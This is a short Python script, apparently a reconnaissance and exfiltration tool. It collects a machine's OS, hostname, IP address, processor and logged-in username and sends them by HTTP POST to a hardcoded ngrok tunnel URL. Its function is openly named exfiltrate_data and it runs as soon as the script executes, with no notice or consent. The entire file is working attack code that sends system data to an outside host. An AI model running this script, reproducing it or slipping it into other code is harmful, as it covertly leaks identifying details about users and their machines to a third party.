import os
import platform
import socket
import requests
import json

# Function to collect system information
def get_system_info():
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Machine": platform.machine(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname()),
        "Processor": platform.processor(),
        "User": os.getlogin()
    }
    return info

# Set the correct server URL
NGROK_URL = "https://c25a-122-15-77-226.ngrok-free.app"  # Replace with your Ngrok URL
SERVER_URL = f"{NGROK_URL}/receive"  # Ensure we send data to /receive

# Function to send data to Flask server
def exfiltrate_data():
    data = get_system_info()
    headers = {"Content-Type": "application/json"}

    try:
        response = requests.post(SERVER_URL, data=json.dumps(data), headers=headers)
        print(f"✅ Data sent successfully! Server responded: {response.text}")
    except Exception as e:
        print(f"❌ Error: {e}")

# Run the exfiltration function
exfiltrate_data()
